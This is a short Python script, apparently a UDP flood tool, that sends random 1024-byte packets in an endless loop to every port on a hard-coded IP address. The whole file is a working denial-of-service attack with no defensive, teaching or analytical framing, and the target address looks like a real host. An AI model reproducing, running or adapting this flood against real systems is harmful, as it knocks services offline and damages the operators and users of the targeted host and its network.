import socket
import random

#creates a socket
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024) #creates packet
ip='46.105.138.248'
sent=0
#infinte loop
while 1:
 for i in range(1,65536):
  port=i
  sock.sendto(bytes,(ip,port))
 print("Sent %s amount of packets to %s at port %s" %(sent,ip,port))
 sent=sent+1
